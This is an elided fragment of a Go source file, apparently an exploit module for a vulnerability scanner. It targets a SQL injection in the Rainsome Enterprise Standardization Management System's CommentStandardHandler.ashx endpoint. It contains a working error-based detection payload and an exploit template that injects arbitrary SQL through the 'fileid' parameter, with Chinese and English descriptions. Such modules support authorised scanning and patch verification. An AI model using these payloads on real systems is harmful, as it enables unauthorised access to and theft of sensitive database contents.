...
func init() {
	expJson := `{
    "Name": "rainsome Enterprise-Standardization-MS  CommentStandardHandler.ashx SQL Injection",
    ...
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/PDCA/ashx/CommentStandardHandler.ashx",
                ...
                "data_type": "text",
                "data": "action=detailInfo&fileid=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
    ...
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                ...
                "data_type": "text",
                "data": "action=detailInfo&fileid=1 and (select {{{exp}}})>0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
    ...
    "Translation": {
        "CN": {
            "Name": "润申信息科技 企业标准化管理系统 CommentStandardHandler.ashx SQL注入漏洞",
            "Product": "企业标准化管理系统",
        ...
        "EN": {
            "Name": "rainsome Enterprise-Standardization-MS  CommentStandardHandler.ashx SQL Injection",
            "Product": "Enterprise-Standardization-MS",
            "Description": "<p>Runshen Information Technology Enterprise Standardization Management System provides customers with various flexible standards and regulations informatization management solutions to help them realize efficient management of standards and regulations and complete the informatization construction of personalized standards and regulations database. The system is vulnerable to SQL injection. Attackers can exploit the vulnerability to obtain sensitive database information.<br><br></p>",
